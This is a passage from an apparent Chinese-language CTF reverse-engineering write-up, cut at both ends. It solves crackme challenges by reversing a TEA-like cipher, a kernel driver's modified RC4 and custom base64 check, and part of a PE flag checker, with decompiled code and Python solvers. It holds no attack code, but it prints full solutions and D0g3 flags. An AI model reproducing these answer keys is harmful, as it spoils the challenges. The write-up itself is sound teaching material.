class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">dec</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> *a)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> b2; </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> b1; </span><br><span class="line">    b1 = *a;</span><br><span class="line">    b2 = a[<span class="number">1</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> e = <span class="number">0x9e3779b9</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tt[<span class="number">4</span>] = &#123; <span class="number">0x11111111</span>, <span class="number">0x11111111</span>, <span class="number">0x11111111</span>, <span class="number">0x11111111</span> &#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        sum += e;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; ++i) &#123;</span><br><span class="line">        </span><br><span class="line">        b2 -= ((b1 &lt;&lt; <span class="number">4</span>) + tt[<span class="number">2</span>] ^ b1 + sum ^ (b1 &gt;&gt; <span class="number">5</span>) + tt[<span class="number">3</span>]);</span><br><span class="line">        b1 -= ((b2 &lt;&lt; <span class="number">4</span>) + tt[<span class="number">0</span>] ^ b2 + sum ^ (b2 &gt;&gt; <span class="number">5</span>) + tt[<span class="number">1</span>]);</span><br><span class="line">        sum -= e;</span><br><span class="line">    &#125;</span><br><span class="line">    *a = b1;</span><br><span class="line">    a[<span class="number">1</span>] = b2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> Q[<span class="number">12</span>] = &#123; <span class="number">0xc873914f</span>,</span><br><span class="line">                            <span class="number">0x4a628600</span>,</span><br><span class="line">                            <span class="number">0x20c77a1c</span>,</span><br><span class="line">                            <span class="number">0x1a877aaa</span>,</span><br><span class="line">                            <span class="number">0xd6faa982</span>,</span><br><span class="line">                            <span class="number">0x60d1c964</span>,</span><br><span class="line">                            <span class="number">0xb9884c32</span>,</span><br><span class="line">                            <span class="number">0x2a08a862</span>,</span><br><span class="line">                            <span class="number">0xc74a0036</span>,</span><br><span class="line">                            <span class="number">0x8f2ee196</span>,</span><br><span class="line">                            <span class="number">0xef08a6a9</span>,</span><br><span class="line">                            <span class="number">0xa3850896</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">6</span>; k++)</span><br><span class="line">    &#123;</span><br><span class="line">        dec(&amp;Q[k*<span class="number">2</span>]);</span><br><span class="line">        <span class="comment">//sdecrypt(&amp;Q[k * 2], &amp;Q[k * 2 + 1]);</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">12</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%#x,\n&quot;</span>, Q[i]);</span><br><span class="line">    getchar();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//0x695f7469,</span></span><br><span class="line"><span class="comment">//0x65625f73,</span></span><br><span class="line"><span class="comment">//0x615f6e65,</span></span><br><span class="line"><span class="comment">//0x6e6f6c5f,</span></span><br><span class="line"><span class="comment">//0x61645f67,</span></span><br><span class="line"><span class="comment">//0x69775f79,</span></span><br><span class="line"><span class="comment">//0x756f6874,</span></span><br><span class="line"><span class="comment">//0x6f795f74,</span></span><br><span class="line"><span class="comment">//0x796d5f75,</span></span><br><span class="line"><span class="comment">//0x6972665f,</span></span><br><span class="line"><span class="comment">//0x646e65,</span></span><br></pre></td></tr></table></figure><p>然后按行取反转hex再全取反得到结果：</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">it_is_been_<span class="built_in">a_long</span>_day_without_you_my_friend</span><br></pre></td></tr></table></figure><p>即</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D0g3&#123;it_is_been_<span class="built_in">a_long</span>_day_without_you_my_friend&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="感觉有点点简单">感觉有点点简单</h2><p>这是一个sys文件，根据网上教程</p><blockquote><p>静态IDA<br>动态SICE 或者 Syser</p></blockquote><p>先尝试用ida打开</p><p>进入主要的检查函数</p><p>找到关键代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (_BYTE)v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( HIDWORD(v1) &lt;= <span class="number">0xC00</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        rc4(NumberOfBytes_4, HIDWORD(v1), <span class="string">&quot;the_key_&quot;</span>, <span class="number">8</span>i64, v1);</span><br><span class="line">        base64(P, NumberOfBytes_4, HIDWORD(v1));</span><br><span class="line">        LOBYTE(v1) = sub_140001560(P, <span class="number">56</span>i64);</span><br><span class="line">        v8 = <span class="string">&quot;tips: YES, RIGHT FLAG.   you got it!&quot;</span>;</span><br><span class="line">        v7 = <span class="string">&quot;tips: NO , WRONG ANSWER. try again !&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> ( (_BYTE)v1 )</span><br><span class="line">          DbgPrint(<span class="string">&quot;tips: %s\n&quot;</span>, v8);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          DbgPrint(<span class="string">&quot;tips: %s\n&quot;</span>, v7);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        DbgPrint(<span class="string">&quot;tips: file to long \n&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">NumberOfBytes_4</span> = ExAllocatePool(NonPagedPool, <span class="number">0</span>x1000ui64)<span class="comment">;</span></span><br><span class="line"><span class="attr">P</span> = ExAllocatePool(NonPagedPool, <span class="number">0</span>x1000ui64)<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>这两个指针的初始化用了ExAllocatePool函数</p><p>这是内核模式下的内存分配函数，意思是从非分页池中分配4096字节给两个指针</p><p>在最后有ExFreePoolWithTag释放这两个空间，这两个函数类似于malloc和free</p><p>在最后LOBYTE(v1) = sub_140001560(P, 56i64);   // 比较函数进行了比较</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> __fastcall <span class="title function_">sub_140001560</span><span class="params">(__int64 a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> a2 == <span class="number">56</span> &amp;&amp; !(<span class="type">unsigned</span> <span class="type">int</span>)sub_1400019F0(a1, <span class="string">&quot;6zviISn2McHsa4b108v29tbKMtQQXQHA+2+sTYLlg9v2Q2Pq8SP24Uw=&quot;</span>, <span class="number">56</span>i64);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>意思是令a1等于后面的值，也就是说拿到P的终值了：</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">6</span>zviIS<span class="symbol">n2</span>McHsa<span class="number">4</span>b<span class="number">108</span>v<span class="number">29</span>tbKMtQQXQHA<span class="number">+2</span>+sTYLl<span class="name">g9</span>v<span class="number">2</span>Q<span class="number">2</span>Pq<span class="number">8</span>SP<span class="number">24</span>Uw=</span><br></pre></td></tr></table></figure><p>因为other通过自定义base64转换成P所以other终值直接放base64解码是</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">otherl = [<span class="number">0x70</span>,<span class="number">0x5c</span>,<span class="number">0x9e</span>,<span class="number">0xcc</span>,<span class="number">0x4d</span>,<span class="number">0x4c</span>,<span class="number">0xe2</span>,<span class="number">0x08</span>,</span><br><span class="line">          <span class="number">0x8e</span>,<span class="number">0xac</span>,<span class="number">0x00</span>,<span class="number">0xd0</span>,<span class="number">0x5b</span>,<span class="number">0x0c</span>,<span class="number">0x8c</span>,<span class="number">0x95</span>,</span><br><span class="line">          <span class="number">0x80</span>,<span class="number">0xc1</span>,<span class="number">0xe1</span>,<span class="number">0x85</span>,<span class="number">0x14</span>,<span class="number">0xf1</span>,<span class="number">0x48</span>,<span class="number">0x92</span>,</span><br><span class="line">          <span class="number">0x4c</span>,<span class="number">0xc4</span>,<span class="number">0xce</span>,<span class="number">0xee</span>,<span class="number">0x4d</span>,<span class="number">0x89</span>,<span class="number">0x36</span>,<span class="number">0x5c</span>,</span><br><span class="line">          <span class="number">0x8c</span>,<span class="number">0x50</span>,<span class="number">0xc8</span>,<span class="number">0xd1</span>,<span class="number">0xc0</span>,<span class="number">0x48</span>,<span class="number">0xcc</span>,<span class="number">0x03</span>,</span><br><span class="line">          <span class="number">0x11</span>]</span><br></pre></td></tr></table></figure><p>不对，这个base64不是常规的，要自己写解密函数，因为加密部分是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*(_BYTE *)(a1 + v5) = v6[*(_BYTE *)(a2 + v4) &amp; <span class="number">0x3F</span>];</span><br><span class="line">   *(_BYTE *)(a1 + v5 + <span class="number">1</span>) = v6[(<span class="number">4</span> * (*(_BYTE *)(a2 + v4 + <span class="number">1</span>) &amp; <span class="number">0xF</span>)) | ((*(_BYTE *)(a2 + v4) &amp; <span class="number">0xC0</span>) &gt;&gt; <span class="number">6</span>)];</span><br><span class="line">   *(_BYTE *)(a1 + v5 + <span class="number">2</span>) = v6[(<span class="number">16</span> * (*(_BYTE *)(a2 + v4 + <span class="number">2</span>) &amp; <span class="number">3</span>)) | ((*(_BYTE *)(a2 + v4 + <span class="number">1</span>) &amp; <span class="number">0xF0</span>) &gt;&gt; <span class="number">4</span>)];</span><br><span class="line">   *(_BYTE *)(a1 + v5 + <span class="number">3</span>) = v6[(*(_BYTE *)(a2 + v4 + <span class="number">2</span>) &amp; <span class="number">0xFC</span>) &gt;&gt; <span class="number">2</span>];</span><br></pre></td></tr></table></figure><p>加密过程是：</p><p>a =0位后6个</p><p>b=0位前2和1位后4组合</p><p>c=2位后2和1位前4</p><p>d=2位前6</p><p>所以：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">num = [<span class="number">0</span>]*<span class="number">42</span></span><br><span class="line"><span class="built_in">input</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line">last = <span class="built_in">list</span>(<span class="string">&#x27;6zviISn2McHsa4b108v29tbKMtQQXQHA+2+sTYLlg9v2Q2Pq8SP24Uw&#x27;</span>)<span class="comment">#最后剩三个</span></span><br><span class="line">table = [<span class="built_in">ord</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;4KBbSzwWClkZ2gsr1qA+Qu0FtxOm6/iVcJHPY9GNp7EaRoDf8UvIjnL5MydTX3eh&#x27;</span>]</span><br><span class="line">tl = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">way</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(table)):</span><br><span class="line">        <span class="keyword">if</span> (table[i]==n):</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(last)):</span><br><span class="line">    tl.append(<span class="built_in">ord</span>(last[i]))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(num),<span class="number">3</span>):</span><br><span class="line"></span><br><span class="line">    num[i] = ((way(tl[j])) | (((way(tl[j+<span class="number">1</span>])) &amp; <span class="number">3</span>)  &lt;&lt; <span class="number">6</span>))</span><br><span class="line">    num[i+<span class="number">1</span>] = (((way(tl[j+<span class="number">1</span>]) &amp; <span class="number">0x3c</span>) &gt;&gt; <span class="number">2</span>) | ((way(tl[j+<span class="number">2</span>]) &amp; <span class="number">0xf</span>) &lt;&lt; <span class="number">4</span>))</span><br><span class="line">    <span class="keyword">if</span> ((j+<span class="number">3</span>) &lt; <span class="built_in">len</span>(num)):</span><br><span class="line">        num[i+<span class="number">2</span>] = ((way(tl[j+<span class="number">3</span>]) &lt;&lt; <span class="number">2</span>) | ((way(tl[j+<span class="number">2</span>]) &amp; <span class="number">0x3c</span>) &gt;&gt; <span class="number">4</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        num[i+<span class="number">2</span>] = ((way(tl[j+<span class="number">2</span>]) &amp; <span class="number">0x3c</span>) &gt;&gt; <span class="number">4</span>)</span><br><span class="line">    j += <span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(num)):</span><br><span class="line">    <span class="built_in">input</span> += <span class="built_in">chr</span>(num[i])</span><br><span class="line">hnum = [<span class="built_in">hex</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> num]</span><br><span class="line"><span class="built_in">print</span>(hnum)</span><br><span class="line"><span class="built_in">print</span>(num)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">input</span>)</span><br><span class="line"><span class="comment">#[&#x27;0x5c&#x27;, &#x27;0x21&#x27;, &#x27;0x7b&#x27;, &#x27;0x33&#x27;, &#x27;0x51&#x27;, &#x27;0x33&#x27;, &#x27;0x38&#x27;, &#x27;0x28&#x27;, &#x27;0x3a&#x27;, &#x27;0x2b&#x27;, &#x27;0x30&#x27;, &#x27;0x40&#x27;, &#x27;0x16&#x27;, &#x27;0x2c&#x27;, &#x27;0x33&#x27;, &#x27;0x25&#x27;, &#x27;0x36&#x27;, &#x27;0x4&#x27;, &#x27;0x38&#x27;, &#x27;0x46&#x27;, &#x27;0x51&#x27;, &#x27;0x3c&#x27;, &#x27;0x25&#x27;, &#x27;0x4a&#x27;, &#x27;0x13&#x27;, &#x27;0x33&#x27;, &#x27;0x39&#x27;, &#x27;0x3b&#x27;, &#x27;0x69&#x27;, &#x27;0x27&#x27;, &#x27;0x4d&#x27;, &#x27;0x29&#x27;, &#x27;0x3&#x27;, &#x27;0x14&#x27;, &#x27;0x33&#x27;, &#x27;0x2&#x27;, &#x27;0x30&#x27;, &#x27;0x31&#x27;, &#x27;0x2&#x27;, &#x27;0x40&#x27;, &#x27;0x6c&#x27;, &#x27;0x0&#x27;]</span></span><br><span class="line"><span class="comment">#[92, 33, 123, 51, 81, 51, 56, 40, 58, 43, 48, 64, 22, 44, 51, 37, 54, 4, 56, 70, 81, 60, 37, 74, 19, 51, 57, 59, 105, 39, 77, 41, 3, 20, 51, 2, 48, 49, 2, 64, 108, 0]</span></span><br><span class="line"><span class="comment">#\!&#123;3Q38(:+0@,3%68FQ&lt;%J39;i&#x27;M)301@l</span></span><br></pre></td></tr></table></figure><p>要注意：</p><ul><li>逆向时位数是6，左移右移和与的值要注意</li><li>py左移时不会溢出</li><li>最后剩了三个要分情况</li></ul><p>得到值</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">[92, 33, 123, 51, 81, 51, 56, 40, 58, 43, 48, 64, 22, 44, 51, 37, 54, 4, 56, 70, 81, 60, 37, 74, 19, 51, 57, 59, 105, 39, 77, 41, 3, 20, 51, 2, 48, 49, 2, 64, 108, 0]</span></span><br></pre></td></tr></table></figure><p>最后在上面那个函数rc4</p><p>因为这里是对称加密，直接复制其实就可以了，或者如果会调试sys，直接输入密文就好了</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">otherl = [<span class="number">92</span>, <span class="number">33</span>, <span class="number">123</span>, <span class="number">51</span>, <span class="number">81</span>, <span class="number">51</span>, <span class="number">56</span>, <span class="number">40</span>, <span class="number">58</span>, <span class="number">43</span>, <span class="number">48</span>, <span class="number">64</span>, <span class="number">22</span>, <span class="number">44</span>, <span class="number">51</span>, <span class="number">37</span>, <span class="number">54</span>, <span class="number">4</span>, <span class="number">56</span>, <span class="number">70</span>, <span class="number">81</span>, <span class="number">60</span>, <span class="number">37</span>, <span class="number">74</span>, <span class="number">19</span>, <span class="number">51</span>, <span class="number">57</span>, <span class="number">59</span>, <span class="number">105</span>, <span class="number">39</span>, <span class="number">77</span>, <span class="number">41</span>, <span class="number">3</span>, <span class="number">20</span>, <span class="number">51</span>, <span class="number">2</span>, <span class="number">48</span>, <span class="number">49</span>, <span class="number">2</span>, <span class="number">64</span>, <span class="number">108</span>]</span><br><span class="line">k = <span class="string">&#x27;&#x27;</span></span><br><span class="line">p = []</span><br><span class="line">inset = [<span class="number">0</span>]*<span class="number">64</span></span><br><span class="line">S = [<span class="number">0</span>]*<span class="number">64</span></span><br><span class="line">key = <span class="built_in">list</span>(<span class="string">&#x27;the_key_&#x27;</span>)</span><br><span class="line"><span class="comment">#初始化</span></span><br><span class="line">a = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">    inset[i] = i</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">    S[i] = <span class="built_in">ord</span>(key[i % <span class="number">8</span>])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">    a = (S[i] + inset[i] + a) % <span class="number">64</span></span><br><span class="line">    inset[i],inset[a] = inset[a],inset[i]</span><br><span class="line"></span><br><span class="line">b = c = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(otherl)):</span><br><span class="line">    b = (b + <span class="number">1</span>) % <span class="number">64</span>;</span><br><span class="line">    c = (inset[b] + c) % <span class="number">64</span></span><br><span class="line">    inset[b],inset[c] = inset[c],inset[b]</span><br><span class="line">    otherl[i] ^= ((c ^ b) &amp; inset[(((c ^ b) + inset[c] + inset[b]) % <span class="number">64</span>)])</span><br><span class="line">    k += <span class="built_in">chr</span>(otherl[i])</span><br><span class="line">    p.append(otherl[i])</span><br><span class="line"><span class="built_in">print</span>(k)</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"><span class="comment">#D0g3&#123;608292C4-15400BA4-B3299A5C-0429D&#125;</span></span><br></pre></td></tr></table></figure><hr><h2 id="你好PE">你好PE</h2><p>ida打开后搜索字符，找不到， 尝试动态调试找到主函数</p><p>最后找到主函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_1005F820</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *v1; <span class="comment">// [esp+D0h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  sub_1005B16F(&amp;unk_1014000F);</span><br><span class="line">  ((<span class="type">void</span> (__stdcall *)(_DWORD, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>))kernel32_VirtualAlloc)(<span class="number">0</span>, <span class="number">65548</span>, <span class="number">12288</span>, <span class="number">4</span>);</span><br><span class="line">  v1 = (_DWORD *)sub_1005A260();</span><br><span class="line">  <span class="keyword">if</span> ( !v1 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  v1[<span class="number">1</span>] = <span class="number">0x10000</span>;</span><br><span class="line">  *v1 = <span class="number">0</span>;</span><br><span class="line">  v1[<span class="number">2</span>] = v1 + <span class="number">3</span>;</span><br><span class="line">  sub_10059572(v1[<span class="number">2</span>], <span class="number">0</span>, v1[<span class="number">1</span>]);</span><br><span class="line">  sub_10058BC7(<span class="string">&quot;[out]: PLZ Input FLag \n&quot;</span>);</span><br><span class="line">  sub_10058BC7(<span class="string">&quot;[in ]: &quot;</span>);</span><br><span class="line">  sub_100581A4(&amp;unk_10114B68, v1[<span class="number">2</span>]);</span><br><span class="line">  *v1 = sub_1005B5BB(v1[<span class="number">2</span>]);</span><br><span class="line">  <span class="keyword">if</span> ( *v1 == <span class="number">41</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *v1 = <span class="number">48</span>;</span><br><span class="line">    sub_1005A242(v1);</span><br><span class="line">    <span class="keyword">if</span> ( sub_10058AA0(v1[<span class="number">2</span>], &amp;unk_1013C008, <span class="number">48</span>) )</span><br><span class="line">      sub_10058BC7(<span class="string">&quot;[out]: WRONG FLAG\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      sub_10058BC7(<span class="string">&quot;[out]: RIGHT FLAG\n&quot;</span>);</span><br><span class="line">    ((<span class="type">void</span> (__stdcall *)(_DWORD *, _DWORD, <span class="type">int</span>))kernel32_VirtualFree)(v1, <span class="number">0</span>, <span class="number">49152</span>);</span><br><span class="line">    sub_1005A260();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    sub_10058BC7(<span class="string">&quot;[out]: len error\n&quot;</span>);</span><br><span class="line">    ((<span class="type">void</span> (__stdcall *)(_DWORD *, _DWORD, <span class="type">int</span>))kernel32_VirtualFree)(v1, <span class="number">0</span>, <span class="number">49152</span>);</span><br><span class="line">    sub_1005A260();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有两个函数需要注意</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sub_1005A242(v1);</span><br><span class="line"><span class="keyword">if</span> ( sub_10058AA0(v1[<span class="number">2</span>], &amp;unk_1013C008, <span class="number">48</span>) )</span><br></pre></td></tr></table></figure><p>第二个函数进去之后根据逻辑判断</p><p>先比较了前32个值，然后很麻烦的比较了后面的值，反正就是那两个值相等</p><p>也就是说末值就是unk_1013C008</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0x4D</span>, <span class="number">0xB8</span>, <span class="number">0x76</span>, <span class="number">0x29</span>, <span class="number">0xF5</span>, <span class="number">0xA9</span>, <span class="number">0x9E</span>, <span class="number">0x59</span>, <span class="number">0x55</span>, <span class="number">0x56</span>, <span class="number">0xB1</span>, <span class="number">0xC4</span>, <span class="number">0x2F</span>, <span class="number">0x21</span>, <span class="number">0x2C</span>, <span class="number">0x30</span>, <span class="number">0xB3</span>, <span class="number">0x79</span>, <span class="number">0x78</span>, <span class="number">0x17</span>, <span class="number">0xA8</span>, <span class="number">0xED</span>, <span class="number">0xF7</span>, <span class="number">0xDB</span>, <span class="number">0xE1</span>, <span class="number">0x53</span>, <span class="number">0xF0</span>, <span class="number">0xDB</span>, <span class="number">0xE9</span>, <span class="number">0x03</span>, <span class="number">0x51</span>, <span class="number">0x5E</span>, <span class="number">0x09</span>, <span class="number">0xC1</span>, <span class="number">0x00</span>, <span class="number">0xDF</span>, <span class="number">0xF0</span>, <span class="number">0x96</span>, <span class="number">0xFC</span>, <span class="number">0xC1</span>, <span class="number">0xB5</span>, <span class="number">0xE6</span>, <span class="number">0x62</span>, <span class="number">0x95</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>]</span><br></pre></td></tr></table></figure><p>第一个应该是加密，用findcrypt搜索一下，搜不出来。。好像在调试的时候搜会很卡，那就直接分析</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">sub_1005F6F0</span><span class="params">(_DWORD *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [esp+D0h] [ebp-30h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+DCh] [ebp-24h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [esp+E8h] [ebp-18h]</span></span><br><span class="line">  <span class="type">int</span> *v5; <span class="comment">// [esp+F8h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  sub_1005B16F(&amp;unk_1014000F);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; *a1 &gt;&gt; <span class="number">3</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = (<span class="type">int</span> *)(a1[<span class="number">2</span>] + <span class="number">8</span> * i);</span><br><span class="line">    v1 = *v5;</span><br><span class="line">    v4 = *(_QWORD *)v5;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">64</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      LOBYTE(v1) = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v4 &lt; <span class="number">0</span> )</span><br><span class="line">        v4 = qword_1013C000 ^ sub_10059F9F(v1, HIDWORD(v4));</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        v4 = sub_10059F9F(v1, HIDWORD(v4));</span><br><span class="line">    &#125;</span><br><span class="line">    *(_QWORD *)v5 = 